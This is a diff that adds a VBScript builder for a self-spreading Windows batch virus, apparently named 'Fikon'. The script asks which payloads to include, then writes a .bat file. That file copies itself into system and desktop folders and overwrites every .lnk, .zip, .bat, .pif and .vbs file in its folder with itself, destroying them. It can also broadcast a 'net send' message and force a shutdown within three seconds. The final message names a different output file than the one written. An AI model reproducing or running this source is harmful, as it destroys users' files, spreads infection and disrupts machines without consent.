@@ -1,0 +1,89 @@
+Dim fso, opt, copy, shutd, infect, netmsg, virii
+Dim readSpread, readShutd, readHide
+set fso = CreateObject("Scripting.FileSystemObject")
+opt = inputbox("What do you want to do?" &vbnewline& "Choose   [Copy ,  NetMsg ,  Infect ,  Shutdown]" &vbnewline&_
+"Example:" &vbnewline& "netmsg, infect  or" &vbnewline& "copy, infect, shutdown  etc"  ,"Fikon")
+opt = Lcase(opt)
+set copy = fso.CreateTextFile("C:\copy.dll",True)
+copy.WriteLine ("copy %0 C:\%random%.bat")
+copy.WriteLine ("copy %0 C:\progra~1\%random%.bat")
+copy.WriteLine ("copy %0 C:\winnt\%random%.bat")
+copy.WriteLine ("copy %0 C:\windows\%random%.bat")
+copy.WriteLine ("copy %0 C:\winnt\system32\%random%.bat")
+copy.WriteLine ("copy %0 C:\windows\system32\%random%.bat")
+copy.WriteLine ("copy %0 C:\docume~1\%random%.bat")
+copy.WriteLine ("copy %0 C:\docume~1\alluse~1\desktop\%random%.bat")
+copy.Close
+set netmsg = fso.CreateTextFile("C:\netmsg.dll")
+netmsg.WriteLine ("net send * Fikon was here")
+netmsg.Close
+set infect = fso.CreateTextFile("C:\infect.dll",True)
+infect.writeline ("For %%a In (*.lnk) DO copy %0 %%a")
+infect.writeline ("For %%a In (*.zip) DO copy %0 %%a")
+infect.writeline ("For %%a In (*.bat) DO copy %0 %%a")
+infect.writeline ("For %%a In (*.pif) Do copy %0 %%a")
+infect.writeline ("For %%a In (*.vbs) DO copy %0 %%a")
+infect.Close
+set shutd = fso.CreateTextFile("C:\shutdown.dll",True)
+shutd.WriteLine ("shutdown -s -t 03")
+shutd.WriteLine ("RUNDLL32 SHELL32.DLL,SHExitWindowsEx 1.")
+shutd.Close
+set virii = fso.CreateTextFile("C:\virii.bat",True)
+virii.WriteLine ("@echo off")
+virii.WriteLine ("cls")
+virii.WriteLine "Rem Fikon was here"
+set readcopy = fso.OpenTextFile("C:\copy.dll")
+set readnetmsg = fso.OpenTextFile("C:\netmsg.dll")
+set readinfect = fso.OpenTextFile("C:\infect.dll")
+set readshutd = fso.OpenTextFile("C:\shutdown.dll")
+Select Case opt
+case "copy, netmsg, infect, shutdown"
+virii.WriteLine readcopy.Readall
+virii.WriteLine readnetmsg.Readall
+virii.WriteLine readinfect.Readall
+virii.WriteLine readshutd.Readall
+case "copy, netmsg, infect"
+virii.WriteLine readcopy.Readall
+virii.WriteLine readnetmsg.Readall
+virii.WriteLine readinfect.Readall
+case "copy, netmsg"
+virii.WriteLine readcopy.Readall
+virii.WriteLine readnetmsg.Readall
+case "copy, infect"
+virii.WriteLine readcopy.Readall
+virii.WriteLine readinfect.Readall
+case "copy, shutdown"
+virii.WriteLine readcopy.Readall
+virii.WriteLine readshutd.Readall
+case "copy"
+virii.WriteLine readcopy.Readall
+case "netmsg, infect, shutdown"
+virii.WriteLine readnetmsg.Readall
+virii.WriteLine readinfect.Readall
+virii.WriteLine readshutd.Readall
+case "netmsg, infect"
+virii.WriteLine readnetmsg.Readall
+virii.WriteLine readinfect.Readall
+case "netmsg, shutdown"
+virii.WriteLine readnetmsg.Readall
+virii.WriteLine readshutd.Readall
+case "netmsg"
+virii.WriteLine readnetmsg.Readall
+case "infect, shutdown"
+virii.WriteLine readinfect.Readall
+virii.WriteLine readshutd.Readall
+case "infect"
+virii.WriteLine readinfect.Readall
+case "shutdown"
+virii.WriteLine readshutd.Readall
+end select
+virii.Close
+readcopy.Close
+readnetmsg.Close
+readinfect.Close
+readshutd.Close
+fso.DeleteFile "C:\copy.dll",True
+fso.DeleteFile "C:\netmsg.dll",True
+fso.DeleteFile "C:\infect.dll",True
+fso.DeleteFile "C:\shutdown.dll",True
+msgbox "Created C:\fikon.bat"
